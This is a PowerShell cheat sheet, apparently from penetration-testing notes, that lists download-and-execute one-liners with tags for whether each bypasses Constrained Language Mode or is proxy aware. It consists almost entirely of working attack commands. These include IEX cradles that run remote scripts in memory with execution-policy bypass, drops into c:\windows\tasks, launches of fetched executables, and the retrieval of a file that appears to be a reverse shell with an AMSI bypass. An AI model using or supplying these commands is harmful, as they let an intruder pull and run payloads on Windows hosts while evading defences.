## Download/Execute in Memory

### Load Powershell Script directly into memory: 
Bypass CLM | Proxy Aware 
-------|---------
[ ] | [ X ]   

```
$str = "(New-Object System.Net.WebClient).DownloadString('http://192.168.1.121/getuser.ps1') | IEX"
Invoke-Expression $str
```


### Load Powershell Script directly into memory: 
Bypass CLM | Proxy Aware 
-------|---------
[ ] | [ X ]

```
powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.65/run.txt'))
```


## Download Files

###  System.Net.Http Download Files
Bypass CLM | Proxy Aware 
-------|---------
[ ] | [ X ]

```
Add-Type -AssemblyName System.Net.Http;$a=(New-Object System.Net.Http.HttpClient).getasync('http://192.168.49.65/issue.hta'); $a.wait();$o=[System.IO.FileStream]::new('c:\windows\tasks\test.txt', [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write);$a.Result.Content.CopyToAsync($o).Wait();$o.close()
```

### System.net.WebClient DownloadFile
Bypass CLM | Proxy Aware 
-------|---------
[ ] | [ X ]

```
(new-object System.Net.WebClient).downloadFile('http://192.168.49.65/test.txt','c:\windows\tasks\test.txt')
```


### Invoke-RestMethod
Bypass CLM | Proxy Aware 
-------|---------
[ X ] | [ X ]
```
Invoke-RestMethod -Uri http://192.168.49.65/tete.exe -OutFile c:\windows\tasks\test.txt
Start-Process -FilePath "Purecsrunner.exe"
```

### Invoke-WebRequest
Bypass CLM | Proxy Aware 
-------|---------
[ X ] | [ X ]

```
Invoke-WebRequest -Uri 'http://192.168.49.65/Purecsrunner.exe' -OutFile 'Purecsrunner.exe'
Start-Process -FilePath "Purecsrunner.exe"
```

### Powershell IWR
Bypass CLM | Proxy Aware 
-------|---------
[ X ] | [ X ]

or (Appears to work in constrained Language mode (CLN) ) - Proxy aware
```
powershell.exe iwr -uri 192.168.1.2/putty.exe -o C:\Temp\putty.exe
```

### Powershell-Wget
Bypass CLM | Proxy Aware 
-------|---------
[ X ] | [ X ]

```
powershell wget http://192.168.49.65/psscripts/PlainRS-wAmsiByp/rshell-am.txt -outfile c:\windows\tasks\test.exe
```

### Start-bitstransfer
Bypass CLM | Proxy Aware 
-------|---------
[ X ] | [ X ]

```
powershell -c "start-bitstransfer -source http://192.168.49.65/some.exe c:\windows\tasks\some.exe"
```
